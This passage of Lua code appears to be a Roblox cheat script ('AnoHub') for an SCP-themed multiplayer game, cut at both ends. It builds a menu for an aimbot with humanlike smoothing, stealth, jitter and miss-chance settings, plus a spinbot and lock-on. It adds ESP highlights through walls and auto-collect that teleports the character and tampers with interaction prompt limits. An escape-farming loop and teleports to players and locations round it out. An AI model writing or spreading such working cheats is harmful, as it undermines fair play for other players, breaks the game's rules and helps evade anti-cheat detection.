    AimbotGroup:AddDropdown("AimbotSmoothCurve", {
        Text = "Smoothing Curve", Values = {"Linear", "EaseIn", "EaseOut", "Exponential"},
        Default = "Linear",
        Tooltip = "Smoothing curve",
        Callback = function(Value) aimbotSettings.HumanLikeSmoothing = Value end,
    })

    AimbotGroup:AddSlider("AimbotDelay", {
        Text = "Aim Delay (ms)", Default = 0, Min = 0, Max = 500, Rounding = 0,
        Tooltip = "Delay before aiming",
        Callback = function(Value) aimbotSettings.AimDelay = Value end,
    })

    AimbotGroup:AddToggle("AimbotStealth", {
        Text = "Stealth Mode", Default = false,
        Tooltip = "First aim is very slow",
        Callback = function(Value) aimbotSettings.StealthMode = Value end,
    })

    AimbotGroup:AddSlider("AimbotMissChance", {
        Text = "Miss Chance (%)", Default = 0, Min = 0, Max = 50, Rounding = 0,
        Tooltip = "Chance to miss",
        Callback = function(Value) aimbotSettings.MissChance = Value end,
    })

    AimbotGroup:AddSlider("AimbotJitter", {
        Text = "Random Jitter", Default = 0, Min = 0, Max = 10, Rounding = 0,
        Tooltip = "Random crosshair shake",
        Callback = function(Value) aimbotSettings.RandomJitter = Value end,
    })

    AimbotGroup:AddDropdown("AimbotFOVShape", {
        Text = "FOV Shape", Values = {"Circle", "Box"},
        Default = "Circle",
        Tooltip = "FOV shape",
        Callback = function(Value)
            aimbotSettings.FOVShape = Value
            _G.CreateAimbotCircle()
        end,
    })

    AimbotGroup:AddToggle("Aimbot360", {
        Text = "360 FOV (ignore)", Default = false,
        Tooltip = "Ignore FOV",
        Callback = function(Value) aimbotSettings.FOVIgnore = Value end,
    })

    AimbotGroup:AddToggle("ShowFOVCircle", {
        Text = "Show FOV Circle", Default = true,
        Tooltip = "Show FOV circle",
        Callback = function(Value)
            aimbotSettings.ShowFOVCircle = Value
            if Value then _G.CreateAimbotCircle() else _G.RemoveAimbotCircle() end
        end,
    })

    local fovColorPresets = {
        ["Red"] = Color3.fromRGB(255,0,0), ["Blue"] = Color3.fromRGB(0,100,255),
        ["White"] = Color3.fromRGB(255,255,255), ["Orange"] = Color3.fromRGB(215,110,0),
        ["Purple"] = Color3.fromRGB(160,32,240), ["Black"] = Color3.fromRGB(0,0,0),
        ["Pink"] = Color3.fromRGB(255,105,180), ["Green"] = Color3.fromRGB(0,200,0),
        ["Yellow"] = Color3.fromRGB(255,255,0), ["Light Blue"] = Color3.fromRGB(135,206,250),
        ["Cyan"] = Color3.fromRGB(0,255,255),
    }
    local fovColorNames = {}
    for k, _ in pairs(fovColorPresets) do table.insert(fovColorNames, k) end
    table.sort(fovColorNames)

    AimbotGroup:AddDropdown("FOVCircleColor", {
        Text = "FOV Circle Color", Values = fovColorNames, Default = "Red",
        Tooltip = "FOV color",
        Callback = function(Value)
            local col = fovColorPresets[Value]
            if col then
                aimbotSettings.CircleColor = col
                if _G.aimbotFovFrame then _G.aimbotFovFrame.BackgroundColor3 = col end
                if _G.aimbotFovStroke then _G.aimbotFovStroke.Color = col end
            end
        end,
    })

    AimbotGroup:AddToggle("WallCheck", {
        Text = "Wall Check", Default = false,
        Tooltip = "Don't aim through walls",
        Callback = function(Value) aimbotSettings.WallCheck = Value end,
    })

    AimbotGroup:AddDivider()
    AimbotGroup:AddLabel("Tags")

    AimbotGroup:AddToggle("TagFilterEnabled", {
        Text = "Tag Filter (whitelist)", Default = false,
        Tooltip = "Aim only at players with tags",
        Callback = function(Value) aimbotSettings.TagFilterEnabled = Value end,
    })

    AimbotGroup:AddDropdown("TagFilterList", {
        Text = "Target Tags", Values = {"Hostile", "Escaped", "Anomaly", "SCP", "NPC"},
        Default = {}, Multi = true,
        Tooltip = "Select tags",
        Callback = function(Value)
            aimbotSettings.TagFilter = {}
            for tag, on in pairs(Value) do
                if on then aimbotSettings.TagFilter[tag] = true end
            end
        end,
    })

    AimbotGroup:AddToggle("TagBlacklistEnabled", {
        Text = "Tag Blacklist (ignore)", Default = false,
        Tooltip = "Ignore players with tags",
        Callback = function(Value) aimbotSettings.TagBlacklistEnabled = Value end,
    })

    AimbotGroup:AddDropdown("TagBlacklistList", {
        Text = "Ignore Tags", Values = {"Hostile", "Escaped", "Anomaly", "SCP", "NPC"},
        Default = {}, Multi = true,
        Tooltip = "Select tags to ignore",
        Callback = function(Value)
            aimbotSettings.TagBlacklist = {}
            for tag, on in pairs(Value) do
                if on then aimbotSettings.TagBlacklist[tag] = true end
            end
        end,
    })

    AimbotGroup:AddDivider()
    AimbotGroup:AddLabel("Spinbot")

    AimbotGroup:AddToggle("AimbotSpinbot", {
        Text = "Spinbot", Default = false,
        Tooltip = "Spins your character",
        Callback = function(Value)
            aimbotSettings.Spinbot = Value
            if Value then
                statsCounter.spinbotActivations = (statsCounter.spinbotActivations or 0) + 1
                _G.startSpinbot()
            else
                _G.stopSpinbot()
            end
        end,
    })

    AimbotGroup:AddSlider("AimbotSpinSpeed", {
        Text = "Spin Speed", Default = 60, Min = 10, Max = 360, Rounding = 0,
        Tooltip = "Rotation speed",
        Callback = function(Value) aimbotSettings.SpinSpeed = Value end,
    })

    local WLGroup = CombatTab:AddRightGroupbox("Aimbot Player Whitelist")
    WLGroup:AddToggle("PlayerWhitelist", {
        Text = "Player Whitelist", Default = false,
        Tooltip = "Enable ignore for players below",
        Callback = function(Value) playerWhitelist.Enabled = Value end,
    })

    local wlDropdown
    local function updateWLList()
        local targets = {}
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer
                and not (_G.isHiddenDev and _G.isHiddenDev(plr)) then
                table.insert(targets, plr.Name)
            end
        end
        if #targets == 0 then targets = {"No players"} end
        if wlDropdown then
            pcall(function() wlDropdown:Refresh(targets, true) end)
        else
            wlDropdown = WLGroup:AddDropdown("WLPlayer", {
                Text = "Select Player", Values = targets, Default = targets[1] or 1,
                Tooltip = "Select player to add/remove from whitelist",
            })
        end
    end
    updateWLList()
    _G.updateWLList = updateWLList

    WLGroup:AddButton({
        Text = "Add to Whitelist",
        Tooltip = "Add selected player",
        Func = function()
            local selected = wlDropdown and wlDropdown.Value
            if not selected then return end
            for _, existing in pairs(playerWhitelist.Players) do
                if existing:lower() == selected:lower() then
                    Library:Notify(selected .. " already in whitelist!")
                    return
                end
            end
            table.insert(playerWhitelist.Players, selected)
            Library:Notify(selected .. " added!")
        end,
    })
    WLGroup:AddButton({
        Text = "Remove from Whitelist",
        Tooltip = "Remove player",
        Func = function()
            local selected = wlDropdown and wlDropdown.Value
            if not selected then return end
            for i, existing in pairs(playerWhitelist.Players) do
                if existing:lower() == selected:lower() then
                    table.remove(playerWhitelist.Players, i)
                    Library:Notify(selected .. " removed!")
                    return
                end
            end
        end,
    })
    WLGroup:AddButton({
        Text = "Clear All",
        Tooltip = "Clear whitelist",
        Func = function()
            playerWhitelist.Players = {}
            Library:Notify("Whitelist cleared!")
        end,
    })
    WLGroup:AddButton({
        Text = "Refresh List",
        Tooltip = "Refresh player list",
        Func = function()
            if wlDropdown then
                pcall(function() wlDropdown:Destroy() end)
                wlDropdown = nil
            end
            updateWLList()
            Library:Notify("Whitelist list refreshed", 3)
        end,
    })

    local RoleWLGroup = CombatTab:AddRightGroupbox("Aimbot Special Roles Whitelist")

    RoleWLGroup:AddToggle("SpecialRoleWLEnabled", {
        Text = "Enable Role Whitelist", Default = false,
        Tooltip = "Enable ignore for roles below",
        Callback = function(Value)
            specialRoleWhitelist.Enabled = Value
            Library:Notify("Role Whitelist: " .. (Value and "ON" or "OFF"), 4)
        end,
    })

    RoleWLGroup:AddLabel("Don't target these roles:")

    RoleWLGroup:AddToggle("SRW_DClass", { Text = "D-Class", Default = false, Tooltip = "Don't aim at D-Class", Callback = function(v) specialRoleWhitelist.Roles.d_class = v end })
    RoleWLGroup:AddToggle("SRW_Scientist", { Text = "Scientist", Default = false, Tooltip = "Don't aim at Scientist", Callback = function(v) specialRoleWhitelist.Roles.scientist = v end })
    RoleWLGroup:AddToggle("SRW_Security", { Text = "Security", Default = false, Tooltip = "Don't aim at Security", Callback = function(v) specialRoleWhitelist.Roles.security = v end })
    RoleWLGroup:AddToggle("SRW_MTF", { Text = "MTF", Default = false, Tooltip = "Don't aim at MTF", Callback = function(v) specialRoleWhitelist.Roles.mtf = v end })
    RoleWLGroup:AddToggle("SRW_Chaos", { Text = "Chaos Insurgency", Default = false, Tooltip = "Don't aim at Chaos", Callback = function(v) specialRoleWhitelist.Roles.chaos_insurgency = v end })
    RoleWLGroup:AddToggle("SRW_Director", { Text = "Director", Default = false, Tooltip = "Don't aim at Director", Callback = function(v) specialRoleWhitelist.Roles.director = v end })
    RoleWLGroup:AddToggle("SRW_Anomaly", { Text = "Anomaly", Default = false, Tooltip = "Don't aim at Anomaly", Callback = function(v) specialRoleWhitelist.Roles.anomaly = v end })
    RoleWLGroup:AddToggle("SRW_Neutral", { Text = "Neutral", Default = false, Tooltip = "Don't aim at Neutral", Callback = function(v) specialRoleWhitelist.Roles.neutral = v end })

    RoleWLGroup:AddButton({
        Text = "Clear Role Whitelist",
        Tooltip = "Reset all roles",
        Func = function()
            for k, _ in pairs(specialRoleWhitelist.Roles) do
                specialRoleWhitelist.Roles[k] = false
            end
            Library:Notify("Role Whitelist cleared", 4)
        end,
    })

    local LockOnGroup = CombatTab:AddLeftGroupbox("Lock-On")
    LockOnGroup:AddToggle("LockOn", {
        Text = "Lock-On", Default = false,
        Tooltip = "Camera locks on nearest player",
        Callback = function(Value)
            _G.lockOnActive = Value
            if Value then
                statsCounter.lockOnActivations = (statsCounter.lockOnActivations or 0) + 1
            end
            if _G.lockOnActive then
                local closest = _G.getClosestPlayer()
                if closest then _G.setLockOnTarget(closest) end
            else _G.clearLockOn() end
        end,
    })

    local lockOnDropdown
    local function updateLockOnTargets()
        local targets = {}
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer
                and not (_G.isHiddenDev and _G.isHiddenDev(plr)) then
                table.insert(targets, plr.Name)
            end
        end
        if #targets == 0 then targets = {"No players"} end
        if lockOnDropdown then
            pcall(function() lockOnDropdown:Refresh(targets, true) end)
        else
            lockOnDropdown = LockOnGroup:AddDropdown("LockOnTarget", {
                Text = "Select Target", Values = targets, Default = targets[1] or 1,
                Tooltip = "Select target manually",
                Callback = function(Value)
                    for _, plr in pairs(Players:GetPlayers()) do
                        if plr.Name == Value then
                            if _G.lockOnActive then _G.setLockOnTarget(plr) end
                            break
                        end
                    end
                end,
            })
        end
    end
    updateLockOnTargets()
    _G.updateLockOnTargets = updateLockOnTargets

    LockOnGroup:AddButton({
        Text = "Refresh List",
        Tooltip = "Refresh player list",
        Func = function()
            if lockOnDropdown then
                pcall(function() lockOnDropdown:Destroy() end)
                lockOnDropdown = nil
            end
            updateLockOnTargets()
            Library:Notify("Lock-On list refreshed", 3)
        end,
    })

    local MobileGroup = CombatTab:AddLeftGroupbox("Mobile")
    _G.mobileAimbotSize = 70
    _G.mobileAimbotText = "AIM"
    _G.mobileAimbotX = 0.85
    _G.mobileAimbotY = 0.7
    _G.mobileAimbotBtnHeld = false

    local function _destroyMobileAimbotBtn()
        if _G.mobileAimbotGui then
            pcall(function() _G.mobileAimbotGui:Destroy() end)
            _G.mobileAimbotGui = nil
        end
        local pg = LocalPlayer:FindFirstChild("PlayerGui")
        if pg then
            local old = pg:FindFirstChild("AnoHubMobileAimbot")
            if old then pcall(function() old:Destroy() end) end
        end
        _G.mobileAimbotBtn = nil
        _G.mobileAimbotBtnHeld = false
    end

    local function _createMobileAimbotBtn()
        _destroyMobileAimbotBtn()
        local size = _G.mobileAimbotSize or 70
        local gui = Instance.new("ScreenGui")
        gui.Name = "AnoHubMobileAimbot"
        gui.ResetOnSpawn = false
        gui.IgnoreGuiInset = true
        gui.DisplayOrder = 999
        gui.Parent = LocalPlayer:WaitForChild("PlayerGui")

        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, size, 0, size)
        btn.AnchorPoint = Vector2.new(0.5, 0.5)
        btn.Position = UDim2.new(_G.mobileAimbotX, 0, _G.mobileAimbotY, 0)
        btn.BackgroundColor3 = Color3.fromRGB(215, 110, 0)
        btn.BackgroundTransparency = 0.2
        btn.Text = _G.mobileAimbotText or "AIM"
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.TextSize = math.floor(size / 4.5)
        btn.Font = Enum.Font.GothamBold
        btn.BorderSizePixel = 0
        btn.Active = true
        btn.Draggable = true
        btn.Selectable = true
        btn.AutoButtonColor = false
        btn.ZIndex = 10
        btn.Parent = gui
        local c = Instance.new("UICorner")
        c.CornerRadius = UDim.new(1,0)
        c.Parent = btn

        btn.MouseButton1Down:Connect(function() _G.mobileAimbotBtnHeld = true end)
        btn.MouseButton1Up:Connect(function() _G.mobileAimbotBtnHeld = false end)
        btn.MouseLeave:Connect(function() _G.mobileAimbotBtnHeld = false end)
        btn.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
                _G.mobileAimbotBtnHeld = true
            end
        end)
        btn.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
                _G.mobileAimbotBtnHeld = false
            end
        end)
        btn.DragBegin:Connect(function() _G.mobileAimbotBtnHeld = false end)

        _G.mobileAimbotBtn = btn
        _G.mobileAimbotGui = gui
    end

    MobileGroup:AddToggle("MobileAimbot", {
        Text = "Mobile Aimbot Button", Default = false,
        Tooltip = "Shows AIM button",
        Callback = function(Value)
            _G.mobileAimbotActive = Value
            if Value then
                _createMobileAimbotBtn()
                Library:Notify("Mobile Aimbot enabled", 5)
            else
                _destroyMobileAimbotBtn()
                Library:Notify("Mobile Aimbot disabled", 5)
            end
        end,
    })
    MobileGroup:AddSlider("MobileAimbotSize", {
        Text = "Button Size", Default = 70, Min = 40, Max = 200, Rounding = 0,
        Tooltip = "AIM button size",
        Callback = function(Value)
            _G.mobileAimbotSize = Value
            if _G.mobileAimbotBtn then
                _G.mobileAimbotBtn.Size = UDim2.new(0, Value, 0, Value)
                _G.mobileAimbotBtn.TextSize = math.floor(Value / 4.5)
            end
        end,
    })
    MobileGroup:AddSlider("MobileAimbotPosX", {
        Text = "Position X (%)", Default = 85, Min = 0, Max = 100, Rounding = 0,
        Tooltip = "Button horizontal position",
        Callback = function(Value)
            _G.mobileAimbotX = Value / 100
            if _G.mobileAimbotBtn then
                _G.mobileAimbotBtn.Position = UDim2.new(_G.mobileAimbotX, 0, _G.mobileAimbotY, 0)
            end
        end,
    })
    MobileGroup:AddSlider("MobileAimbotPosY", {
        Text = "Position Y (%)", Default = 70, Min = 0, Max = 100, Rounding = 0,
        Tooltip = "Button vertical position",
        Callback = function(Value)
            _G.mobileAimbotY = Value / 100
            if _G.mobileAimbotBtn then
                _G.mobileAimbotBtn.Position = UDim2.new(_G.mobileAimbotX, 0, _G.mobileAimbotY, 0)
            end
        end,
    })
    MobileGroup:AddInput("MobileAimbotText", {
        Text = "Button Text", Default = "AIM", Placeholder = "AIM",
        Numeric = false, Finished = true,
        Tooltip = "AIM button text",
        Callback = function(Value)
            if Value and Value ~= "" then
                _G.mobileAimbotText = Value
                if _G.mobileAimbotBtn then _G.mobileAimbotBtn.Text = Value end
            end
        end,
    })
    MobileGroup:AddSlider("MobileAimbotOpacity", {
        Text = "Button Opacity", Default = 80, Min = 10, Max = 100, Rounding = 0,
        Tooltip = "AIM button transparency",
        Callback = function(Value)
            if _G.mobileAimbotBtn then
                _G.mobileAimbotBtn.BackgroundTransparency = 1 - (Value / 100)
            end
        end,
    })

    local function updateItemsCache()
        itemsCache = {}
        for _, sp in pairs(Workspace:GetDescendants()) do
            if sp:IsA("BasePart") and sp.Name == "Spawn" then
                local im, pr = nil, nil
                for _, o in pairs(sp:GetChildren()) do
                    if o:IsA("Model") then im = o end
                    if o:IsA("ProximityPrompt") then pr = o end
                end
                if im and pr then
                    for k, it in pairs(items) do
                        if it.Enabled and im.Name == it.Model and k ~= "NukeTasks" then
                            local tg = im:FindFirstChildWhichIsA("BasePart", true)
                            if tg and tg:IsDescendantOf(Workspace) then
                                table.insert(itemsCache, {Model=im, Target=tg, ItemName=it.Name, Key=k, Color=it.Color})
                            end
                        end
                    end
                end
            end
        end
        if items.NukeTasks and items.NukeTasks.Enabled then
            for _, sp in pairs(Workspace:GetDescendants()) do
                if sp:IsA("BasePart") then
                    local pr = sp:FindFirstChildWhichIsA("ProximityPrompt")
                    if pr then
                        if sp.Name == "Task1" or sp.Name == "Task2" then
                            table.insert(itemsCache, {Model=sp, Target=sp, ItemName="NUKE " .. sp.Name, Key="NukeTasks", Color=Color3.fromRGB(255,0,0)})
                        end
                        if sp.Name == "Spawn" and sp.Parent then
                            local pn = sp.Parent.Name
                            if pn == "Task3" or pn == "Task4" then
                                table.insert(itemsCache, {Model=sp, Target=sp, ItemName="NUKE " .. pn, Key="NukeTasks", Color=Color3.fromRGB(255,0,0)})
                            end
                        end
                    end
                end
            end
        end
    end
    _G.updateItemsCache = updateItemsCache

    local function clearItemsHL()
        for _, d in pairs(itemsHighlightObjs) do
            if d.HL then d.HL:Destroy() end
            if d.BB then d.BB:Destroy() end
        end
        itemsHighlightObjs = {}
    end

    local function updateItemsHL()
        clearItemsHL()
        if not itemsESPActive then return end
        for _, d in pairs(itemsCache) do
            if d.Model and d.Model:IsDescendantOf(Workspace) then
                local col = d.Color or Color3.fromRGB(215,110,0)
                local h = Instance.new("Highlight")
                h.Parent = d.Model
                h.FillColor = col
                h.FillTransparency = 0.5
                h.OutlineColor = col
                h.OutlineTransparency = 0.3
                h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                local tg = d.Model:FindFirstChildWhichIsA("BasePart", true)
                if tg then
                    local bb = Instance.new("BillboardGui")
                    bb.Parent = tg
                    bb.Size = UDim2.new(0, 120, 0, 20)
                    bb.StudsOffset = Vector3.new(0, 3.5, 0)
                    bb.AlwaysOnTop = true
                    local nl = Instance.new("TextLabel")
                    nl.Parent = bb
                    nl.Size = UDim2.new(1,0,1,0)
                    nl.BackgroundTransparency = 1
                    nl.Text = d.ItemName
                    nl.TextColor3 = col
                    nl.TextSize = 12
                    nl.Font = Enum.Font.GothamBold
                    nl.TextStrokeColor3 = Color3.fromRGB(0,0,0)
                    nl.TextStrokeTransparency = 0.4
                    table.insert(itemsHighlightObjs, {Model=d.Model, HL=h, BB=bb})
                end
            end
        end
    end
    _G.updateItemsHL = updateItemsHL

    local function startItemsESP()
        itemsESPActive = true
        _G.itemsESPActive = true
        updateItemsCache()
        updateItemsHL()
    end
    local function stopItemsESP()
        itemsESPActive = false
        _G.itemsESPActive = false
        clearItemsHL()
    end
    _G.startItemsESP = startItemsESP
    _G.stopItemsESP = stopItemsESP

    RunService.Heartbeat:Connect(function()
        if not itemsESPActive then return end
        if tick() - itemsUpdateTime < 2 then return end
        itemsUpdateTime = tick()
        updateItemsCache()
        updateItemsHL()
    end)

    local function collectItem(pr)
        if not pr or not pr:IsDescendantOf(Workspace) then return false end
        local ok = pcall(function()
            local oldDuration = pr.HoldDuration
            local oldLOS = pr.RequiresLineOfSight
            local oldDist = pr.MaxActivationDistance

            pr.HoldDuration = 0.05
            pr.RequiresLineOfSight = false
            pr.MaxActivationDistance = 50
            pr.Enabled = true

            if fireproximityprompt then
                fireproximityprompt(pr)
            else
                pr:InputHoldBegin()
                task.wait(0.02)
                pr:InputHoldEnd()
            end

            pr.HoldDuration = oldDuration
            pr.RequiresLineOfSight = oldLOS
            pr.MaxActivationDistance = oldDist
        end)
        return ok
    end
    _G.collectItem = collectItem

    local function startCollect()
        if collecting then return end
        collecting = true
        _G.collecting = true

        local ch = LocalPlayer.Character
        if not ch then collecting = false _G.collecting = false return end
        local hrp = ch:FindFirstChild("HumanoidRootPart")
        if not hrp then collecting = false _G.collecting = false return end

        local startCFrame = hrp.CFrame

        local found = {}
        for _, sp in pairs(Workspace:GetDescendants()) do
            if sp:IsA("BasePart") and sp.Name == "Spawn" then
                local im, pr = nil, nil
                for _, o in pairs(sp:GetChildren()) do
                    if o:IsA("Model") then im = o end
                    if o:IsA("ProximityPrompt") then pr = o end
                end
                if im and pr then
                    for _, it in pairs(items) do
                        if it.Enabled and im.Name == it.Model and it.Name ~= "NUKE TASKS" then
                            local tg = im:FindFirstChildWhichIsA("BasePart", true)
                            if tg and tg:IsDescendantOf(Workspace) then
                                table.insert(found, {Prompt = pr, Target = tg, ItemName = it.Name})
                            end
                        end
                    end
                end
            end
        end

        if items.NukeTasks and items.NukeTasks.Enabled then
            for _, sp in pairs(Workspace:GetDescendants()) do
                if sp:IsA("BasePart") then
                    local pr = sp:FindFirstChildWhichIsA("ProximityPrompt")
                    if pr then
                        if sp.Name == "Task1" or sp.Name == "Task2" then
                            table.insert(found, {Prompt = pr, Target = sp, ItemName = "NUKE " .. sp.Name})
                        end
                        if sp.Name == "Spawn" and sp.Parent then
                            local pn = sp.Parent.Name
                            if pn == "Task3" or pn == "Task4" then
                                table.insert(found, {Prompt = pr, Target = sp, ItemName = "NUKE " .. pn})
                            end
                        end
                    end
                end
            end
        end

        if #found == 0 then
            Library:Notify("No items found", 5)
            collecting = false
            _G.collecting = false
            return
        end

        local count = 0
        for _, d in ipairs(found) do
            if d.Target and d.Target:IsDescendantOf(Workspace) then
                pcall(function()
                    hrp.CFrame = d.Target.CFrame + Vector3.new(0, 3, 0)
                    task.wait(0.1)
                    if d.Prompt then
                        collectItem(d.Prompt)
                        count = count + 1
                    end
                    task.wait(0.1)
                end)
            end
        end

        task.wait(0.2)
        pcall(function()
            hrp.CFrame = startCFrame
        end)

        Library:Notify("Collect done! Items: " .. count, 5)
        statsCounter.collects = statsCounter.collects + 1
        collecting = false
        _G.collecting = false
    end
    _G.startCollect = startCollect

    local function startAura()
        if auraActive then return end
        auraActive = true
        _G.auraActive = true
        task.spawn(function()
            while auraActive do
                statsCounter.auraSeconds = (statsCounter.auraSeconds or 0) + 0.5
                local ch = LocalPlayer.Character
                if not ch then task.wait(0.5) continue end
                local hrp = ch:FindFirstChild("HumanoidRootPart")
                if not hrp then task.wait(0.5) continue end
                local pos = hrp.Position
                local rs = _G.auraR * _G.auraR
                for _, sp in pairs(Workspace:GetDescendants()) do
                    if sp:IsA("BasePart") and sp.Name == "Spawn" then
                        local im, pr = nil, nil
                        for _, o in pairs(sp:GetChildren()) do
                            if o:IsA("Model") then im = o end
                            if o:IsA("ProximityPrompt") then pr = o end
                        end
                        if im and pr then
                            for _, it in pairs(items) do
                                if it.Enabled and im.Name == it.Model and it.Name ~= "NUKE TASKS" then
                                    local tg = im:FindFirstChildWhichIsA("BasePart", true)
                                    if tg and tg:IsDescendantOf(Workspace) then
                                        local dx = tg.Position.X - pos.X
                                        local dz = tg.Position.Z - pos.Z
                                        if dx*dx + dz*dz <= rs then collectItem(pr) end
                                    end
                                end
                            end
                        end
                    end
                end
                task.wait(0.5)
            end
        end)
    end
    local function stopAura()
        auraActive = false
        _G.auraActive = false
    end
    _G.startAura = startAura
    _G.stopAura = stopAura

    local function farmLoop()
        _G.farming = true
        while _G.farming and _G.isFarming do
            local parts = {}
            for _, p in pairs(Workspace:GetDescendants()) do
                if p:IsA("BasePart") and p.Name == "Escape" then table.insert(parts, p) end
            end
            if #parts > 0 then
                local ch = LocalPlayer.Character
                if ch then
                    local hrp = ch:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        for i = 1, 4 do
                            if not _G.farming then break end
                            for _, ep in pairs(parts) do
                                if not _G.farming then break end
                                hrp.CFrame = ep.CFrame + Vector3.new(0, 15, 0)
                                task.wait(0.1)
                                hrp.CFrame = ep.CFrame + Vector3.new(0, 8, 0)
                                task.wait(0.1)
                            end
                            task.wait(0.3)
                        end
                    end
                end
            end
            if not _G.farming then break end
            local ch = LocalPlayer.Character
            if ch then
                local hum = ch:FindFirstChild("Humanoid")
                if hum then hum.Health = 0 end
            end
            LocalPlayer.CharacterAdded:Wait()
            task.wait(2)
        end
    end
    _G.farmLoop = farmLoop

    local function escapeDoor()
        local parts = {}
        for _, p in pairs(Workspace:GetDescendants()) do
            if p:IsA("BasePart") and p.Name == "Escape" then table.insert(parts, p) end
        end
        if #parts == 0 then Library:Notify("No Escape parts found") return end
        local ch = LocalPlayer.Character
        if not ch then return end
        local hrp = ch:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        for i, p in pairs(parts) do
            hrp.CFrame = p.CFrame + Vector3.new(0, 8, 0)
            task.wait(0.2)
            hrp.CFrame = p.CFrame + Vector3.new(0, 5, 0)
            task.wait(0.3)
        end
        Library:Notify("Escape done!")
    end
    _G.escapeDoor = escapeDoor

    local TeleportsTab = Tabs.Teleports
    local SCPGroup = TeleportsTab:AddLeftGroupbox("SCP Anomalies")

    local scpLocations = {
        {Name="SCP-035", Target="SCP-035", Type="Part"},
        {Name="SCP-173", Target="Sculpture", Type="Model"},
        {Name="SCP-008", Target="SCP-008", Type="Model"},
        {Name="SCP-049", Target="SCP-049", Type="Model"},
    }

    for _, loc in ipairs(scpLocations) do
        SCPGroup:AddButton({
            Text = loc.Name,
            Tooltip = "Teleport to " .. loc.Name,
            Func = function()
                local found = nil
                for _, p in pairs(Workspace:GetDescendants()) do
                    if loc.Type == "Part" and p:IsA("BasePart") and p.Name == loc.Target then found = p break
                    elseif loc.Type == "Model" and p:IsA("Model") and p.Name == loc.Target then
                        local part = p:FindFirstChildWhichIsA("BasePart", true)
                        if part then found = part break end
                    end
                end
                if not found then Library:Notify("Not found: " .. loc.Target) return end
                local ch = LocalPlayer.Character
                if not ch then return end
                local hrp = ch:FindFirstChild("HumanoidRootPart")
                if not hrp then return end
                hrp.CFrame = found.CFrame + Vector3.new(0, 3, 0)
                statsCounter.teleports = statsCounter.teleports + 1
                Library:Notify("Teleported to " .. loc.Name)
            end,
        })
    end

    local LocationGroup = TeleportsTab:AddLeftGroupbox("Locations")
    local locations = {
        {Name="MTF", Folder="MTF", Part="Spawn"},
        {Name="D-CLASS", Folder="D-CLASS", Part="Spawn"},
        {Name="DIRECTOR", Folder="DIRECTOR", Part="Spawn"},
        {Name="CHAOS", Folder="CHAOS INSURGENCY", Part="Spawn"},
        {Name="SECURITY", Folder="SECURITY", Part="Spawn"},
        {Name="SCIENTIST", Folder="SCIENTIST", Part="Spawn"},
        {Name="NUKE", Folder="_BOMB", Part="Base"},
    }

    for _, loc in ipairs(locations) do
        LocationGroup:AddButton({
            Text = loc.Name,
            Tooltip = "Teleport to " .. loc.Name .. " spawn",
            Func = function()
                local tp = nil
                for _, p in pairs(Workspace:GetDescendants()) do
                    if p:IsA("BasePart") and p.Name == loc.Part then
                        local par = p.Parent
                        if par and par.Name == loc.Folder then tp = p break end
                    end
                end
                if not tp then Library:Notify("Error: " .. loc.Name .. " not found!") return end
                local ch = LocalPlayer.Character
                if not ch then return end
                local hrp = ch:FindFirstChild("HumanoidRootPart")
                if not hrp then return end
                hrp.CFrame = tp.CFrame + Vector3.new(0, 3, 0)
                statsCounter.teleports = statsCounter.teleports + 1
                Library:Notify("Teleported to " .. loc.Name)
            end,
        })
    end

    local GotoGroup = TeleportsTab:AddRightGroupbox("Goto Player")
    local gotoDropdown
    local function updateGotoList()
        local targets = {}
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer
                and not (_G.isHiddenDev and _G.isHiddenDev(plr)) then
                table.insert(targets, plr.Name)
            end
        end
        if #targets == 0 then targets = {"No players"} end
        if gotoDropdown then
            pcall(function() gotoDropdown:Refresh(targets, true) end)
        else
            gotoDropdown = GotoGroup:AddDropdown("GotoPlayer", {
                Text = "Select Player", Values = targets, Default = targets[1] or 1,
                Tooltip = "Select player to teleport to",
            })
        end
    end
    updateGotoList()
    _G.updateGotoList = updateGotoList

    GotoGroup:AddButton({
        Text = "Teleport to Player",
        Tooltip = "Teleport to selected player",
        Func = function()
            local selected = gotoDropdown and gotoDropdown.Value
            if not selected then return end
            for _, plr in pairs(Players:GetPlayers()) do
                if _G.isHiddenDev and _G.isHiddenDev(plr) then continue end
                if plr.Name == selected and plr.Character then
                    local targetHrp = plr.Character:FindFirstChild("HumanoidRootPart")
                    local myCh = LocalPlayer.Character
                    local myHrp = myCh and myCh:FindFirstChild("HumanoidRootPart")
                    if targetHrp and myHrp then
                        myHrp.CFrame = targetHrp.CFrame + Vector3.new(0, 3, 0)
                        statsCounter.teleports = statsCounter.teleports + 1
                        Library:Notify("Teleported to " .. plr.Name)
                    end
                end
            end
        end,
    })
    GotoGroup:AddButton({
        Text = "Refresh List",
        Tooltip = "Refresh player list",
        Func = function()
            if gotoDropdown then
                pcall(function() gotoDropdown:Destroy() end)
                gotoDropdown = nil
            end
            updateGotoList()
            Library:Notify("Goto list refreshed", 3)
        end,
    })

    local CoordGroup = TeleportsTab:AddRightGroupbox("TP to Coordinates")
    local coordX, coordY, coordZ = 0, 0, 0

    CoordGroup:AddInput("CoordX", { Text = "X", Default = "0", Placeholder = "0", Numeric = true, Finished = false, Tooltip = "X coordinate", Callback = function(v) coordX = tonumber(v) or 0 end })
    CoordGroup:AddInput("CoordY", { Text = "Y", Default = "0", Placeholder = "0", Numeric = true, Finished = false, Tooltip = "Y coordinate", Callback = function(v) coordY = tonumber(v) or 0 end })
    CoordGroup:AddInput("CoordZ", { Text = "Z", Default = "0", Placeholder = "0", Numeric = true, Finished = false, Tooltip = "Z coordinate", Callback = function(v) coordZ = tonumber(v) or 0 end })
    CoordGroup:AddLabel("Example: X=100, Y=50, Z=200")

    CoordGroup:AddButton({
        Text = "Teleport to Coordinates",
        Tooltip = "Teleport to entered coordinates",
        Func = function()
            local ch = LocalPlayer.Character
            if not ch then Library:Notify("No character") return end
            local hrp = ch:FindFirstChild("HumanoidRootPart")
